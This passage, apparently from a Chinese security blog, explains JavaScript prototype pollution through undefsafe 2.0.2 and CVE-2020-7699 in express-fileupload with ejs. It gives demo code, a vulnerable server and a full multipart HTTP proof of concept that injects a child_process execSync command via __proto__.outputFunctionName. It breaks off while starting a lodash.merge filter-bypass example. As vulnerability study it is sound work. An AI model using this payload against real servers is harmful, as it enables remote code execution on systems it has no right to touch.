&lt;p>这个模块的核心是一个用来处理访问对象属性不存在时的报错相关逻辑的函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>npm i undefsafe@2.0.2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先简单测试模块使用，首先是用undefined解决烦人的长调用栈报错&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">undefsafe&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;undefsafe&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">d&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a.b.e&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// TypeError: Cannot read property &amp;#39;e&amp;#39; of undefined
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// .....
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">undefsafe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a.c.e&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// undefined
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后是简易赋值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//{ a: { b: { c: 1, d: [Array], e: &amp;#39;amiz&amp;#39; } } }
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">undefsafe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a.b.e&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;123&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// { a: { b: { c: 1, d: [Array], e: &amp;#39;123&amp;#39; } } }
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但如果我们访问的属性不存在&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//{ a: { b: { c: 1, d: [Array], e: &amp;#39;amiz&amp;#39; } } }
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">undefsafe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a.f.e&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;123&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// { a: { b: { c: 1, d: [Array], e: &amp;#39;amiz&amp;#39; }, e: &amp;#39;123&amp;#39; } }
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>它会直接给你摞起来，看起来肥肠的奇怪&lt;/p>
&lt;p>demo1.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">undefsafe&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;undefsafe&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">d&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;__proto__.toString&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">undefsafe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;whoami&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// whoami
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当传入的后两个参数可控时可以污染&lt;code>object&lt;/code>对象&lt;/p>
&lt;p>demo2.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;this is &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// this is [object Object]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">undefsafe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__proto__.toString&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(){&lt;/span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;evil code&amp;#39;&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;this is &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// this is evil code
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将对象和字符串拼接时自动调用&lt;code>toString&lt;/code>，但是test对象中没有，于是到&lt;code>test.__proto__&lt;/code>中寻找，找到了&lt;code>toString&lt;/code>并调用，而此时&lt;code>toString&lt;/code>已经被污染&lt;/p>
&lt;h3 id="结合模板引擎rce的实例">结合模板引擎RCE的实例&lt;/h3>
&lt;h4 id="express-fileupload---cve-2020-7699-1">express-fileupload - CVE-2020-7699&lt;/h4>
&lt;ul>
&lt;li>版本要求：express-fileupload &amp;lt; 1.1.8; &lt;code>parseNested = true&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>同样是这个版本的express-fileupload，还可以结合ejs模板实现RCE&lt;/p>
&lt;p>server.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fileupload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express-fileupload&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fileupload&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">parseNested&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">}))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prototype&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">polluted&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.ejs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url: http://%s:%s/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>index.ejs&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">meta&lt;/span> &lt;span style="color:#75af00">charset&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">title&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">title&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">h1&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>%= message%&amp;gt;&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">h1&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.18.1:3000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=--------1566035451&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">202&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>----------1566035451
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;__proto__.outputFunctionName&amp;#34;;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>_tmp1;global.process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;calc&amp;#39;);var __tmp2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>----------1566035451--
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>与上面相同，发送poc后刷新页面即可弹计算器&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216164651808.png" alt="image-20211216164651808">&lt;/p>
&lt;h4 id="lodashmerge">lodash.merge&lt;/h4>
&lt;ul>
&lt;li>版本要求：lodash &amp;lt; 4.17.11; 4.17.4之后过滤关键词&lt;code>__proto__&lt;/code>，可用&lt;code>Object.constructor.prototype&lt;/code>进行绕过&lt;/li>
&lt;/ul>
&lt;p>server.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">lodash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lodash&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ejs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ejs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//设置模板的位置与种类
